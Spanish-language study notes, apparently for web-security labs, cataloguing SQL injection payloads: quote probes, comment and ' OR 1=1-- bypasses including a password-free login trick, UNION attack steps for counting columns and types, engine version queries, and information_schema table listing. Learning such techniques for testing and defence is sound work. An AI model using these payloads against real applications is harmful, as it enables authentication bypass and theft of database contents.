-F.L.A.G.S-

###> IDENTIFICAR LA VULNERABILIDAD

' | simbolo comun para testear si existe el SQLi o no.

" | simbolo comun para testear si existe el SQLi o no.

' -- | simbolo comun para testear si existe el SQLi o no

###> BYPASS COMUNES

-- | dentro del lenguaje de SQL query, sirve para comentar de manera que todo lo que este despues de los simbolos, se ignora.
ex: SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1

# | dentro del lenguaje de SQL query, sirve para comentar de manera que todo lo que este despues del simbolo, se ignora.

' OR 1=1-- | sirve para crear una consulta a un resultado booleano, de manera que el inicio de la consulta es leido, el resto no ya que
es siempre TRUE.

USER-- | cuando se tiene un usuario se podria probar la vulnerabilidad tratando de ver si hace bypass sin ingresar la contrasena.

###> UNION ATTACK

[necesario saber antes de]
1. saber el numero de columnas
2. saber el tipo de data por columna

_COMO SABER EL NUMERO DE COLUMNAS ?

metodo_1: ' ORDER BY 1--
metodo_2: ' UNION SELECT NULL--
https://github.com/b0ydcBug/webside/blob/main/sql_injection/notas.txt

_COMO SABER EL DATA TYPE DE UNA COLUMNA ?
[es posible saber esto inspeccionando el site como tal]

' UNION SELECT 'a','a'-- | se tiene que hacer iterativo cambiando los campos para saber que tipo son. ese ejemplo esta probando si son string.

ORACLE: ' UNION SELECT 'a','a' from DUAL--
https://docs.oracle.com/database/121/SQLRF/statements_10002.htm

###> IDENTIFICAR INFORMACION DEL MOTOR DE BASE DE DATOS
(para recolectar informacion de la base de datos, debe estar presente el SQLi UNION Attack donde muestre en respuesta (pantalla) la data). tener 
en cuenta las columnas !!

ex: ' UNION SELECT @@version

Microsoft >> SELECT @@version
MySQL >> SELECT @@version
Oracle >> SELECT banner FROM v$version | SELECT version FROM v$instance
PostgreSQL >> SELECT version()

# LISTAR TABLAS DE LA BASE DE DATOS
[ORACLE no tiene esta opcion]

SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns

